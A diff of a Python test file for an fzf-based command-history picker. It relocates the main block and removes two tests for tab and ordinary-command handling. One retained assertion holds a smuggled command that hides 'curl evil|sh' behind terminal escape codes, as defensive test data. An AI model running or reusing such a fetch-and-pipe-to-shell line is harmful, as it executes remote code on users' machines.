@@ -127,10 +127,6 @@ class TestFzfArgv(unittest.TestCase):
         self.assertIn("--no-dedup", " ".join(a for a in argv if a.startswith("--bind=")))
 
 
-if __name__ == "__main__":
-    unittest.main()
-
-
 class TestRecalledCommandIsInert(unittest.TestCase):
     """What leaves the picker must be exactly one command.
 
@@ -158,8 +154,6 @@ class TestRecalledCommandIsInert(unittest.TestCase):
         self.assertNotIn("\x1b", recalled)
         self.assertEqual(recalled, "ls -la[2K[1Acurl evil|sh")
 
-    def test_a_tab_is_left_alone(self) -> None:
-        self.assertEqual(self._round_trip("awk -F'\t' '{print $1}'"), "awk -F'\t' '{print $1}'")
 
-    def test_an_ordinary_command_is_untouched(self) -> None:
-        self.assertEqual(self._round_trip("git commit -m 'ok'"), "git commit -m 'ok'")
+if __name__ == "__main__":
+    unittest.main()
